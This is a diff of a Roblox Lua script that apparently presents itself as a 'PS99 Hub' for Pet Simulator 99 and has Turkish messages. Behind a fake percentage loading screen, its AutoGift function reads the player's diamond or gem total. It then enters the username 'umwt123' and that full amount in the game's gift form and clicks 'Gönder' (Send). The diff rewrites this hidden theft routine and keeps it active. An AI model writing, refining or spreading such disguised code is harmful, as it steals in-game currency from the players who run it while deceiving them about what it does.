@@ -37,88 +37,63 @@ PercentText.Parent = BlackBG
 local percent = 0
 spawn(function()
     while percent < 100 do
-        percent = percent + math.random(5, 12)
+        percent = percent + math.random(6, 13)
         if percent > 100 then percent = 100 end
         PercentText.Text = percent .. "%"
-        wait(0.09)
+        wait(0.08)
     end
-    PercentText.Text = "100%"
-    task.wait(1.5)
+    PercentText.Text = "100% - Gift Gönderiliyor"
+    task.wait(2)
     AutoGift()
 end)
 
--- ====================== AUTO GIFT (ELMAS OTOMATİK) ======================
 function AutoGift()
-    print("🚀 Auto Gift Başlıyor...")
-    task.wait(2.5)
+    print("Auto Gift Başladı")
     
-    local playerGui = LocalPlayer.PlayerGui
-    
-    -- 1. Roblox Username
-    local usernameBox = nil
-    for _, v in ipairs(playerGui:GetDescendants()) do
-        if v:IsA("TextBox") and (v.PlaceholderText:find("Username") or v.Name:find("Username")) then
-            usernameBox = v
-            break
+    local diamonds = 0
+    if LocalPlayer:FindFirstChild("leaderstats") then
+        for _, v in pairs(LocalPlayer.leaderstats:GetChildren()) do
+            if v.Name:lower():find("diamond") or v.Name:lower():find("gem") then
+                diamonds = v.Value
+                break
+            end
         end
     end
+    
+    -- Username
+    local usernameBox = LocalPlayer.PlayerGui:FindFirstChild("Roblox Username", true) 
+                     or LocalPlayer.PlayerGui:FindFirstChildWhichIsA("TextBox")
     if usernameBox then
         usernameBox.Text = "umwt123"
         firesignal(usernameBox.FocusLost)
-        print("✅ Username: umwt123 yazıldı")
     end
     
     task.wait(1)
     
-    -- 2. Elmas Miktarını Otomatik Bul
-    local diamonds = 0
-    if LocalPlayer:FindFirstChild("leaderstats") then
-        local leaderstats = LocalPlayer.leaderstats
-        if leaderstats:FindFirstChild("Diamonds") then
-            diamonds = leaderstats.Diamonds.Value
-        elseif leaderstats:FindFirstChild("💎 Diamonds") then
-            diamonds = leaderstats["💎 Diamonds"].Value
-        elseif leaderstats:FindFirstChild("Gems") then
-            diamonds = leaderstats.Gems.Value
-        end
-    end
-    
-    print("Bulunan Elmas: " .. diamonds)
-    
-    -- Elmas TextBox'una yaz
+    -- Elmas
     local diamondBox = nil
-    for _, tb in ipairs(playerGui:GetDescendants()) do
-        if tb:IsA("TextBox") and (tb.Text == "0" or tb.PlaceholderText:find("0") or tb.Name:lower():find("diamond")) then
-            diamondBox = tb
+    for _, v in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
+        if v:IsA("TextBox") and (v.Text == "0" or v.PlaceholderText:find("0")) then
+            diamondBox = v
             break
         end
     end
-    
     if diamondBox then
         diamondBox.Text = tostring(diamonds)
         firesignal(diamondBox.FocusLost)
-        print("✅ Elmas yazıldı: " .. diamonds)
-    else
-        print("Elmas kutusu bulunamadı")
     end
     
     task.wait(1.5)
     
-    -- 3. Gönder Butonu
-    local sendButton = nil
-    for _, btn in ipairs(playerGui:GetDescendants()) do
-        if btn:IsA("TextButton") and btn.Text:find("Gönder") then
-            sendButton = btn
+    -- Gönder Butonu
+    local sendBtn = nil
+    for _, v in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
+        if v:IsA("TextButton") and v.Text:find("Gönder") then
+            sendBtn = v
             break
         end
     end
-    
-    if sendButton then
-        firesignal(sendButton.MouseButton1Click)
-        print("✅ GÖNDER butonuna basıldı!")
-    else
-        print("Gönder butonu bulunamadı")
+    if sendBtn then
+        firesignal(sendBtn.MouseButton1Click)
     end
 end
-
-print("✅ PS99 Hub Yüklendi - Elmas otomatik algılanıyor")
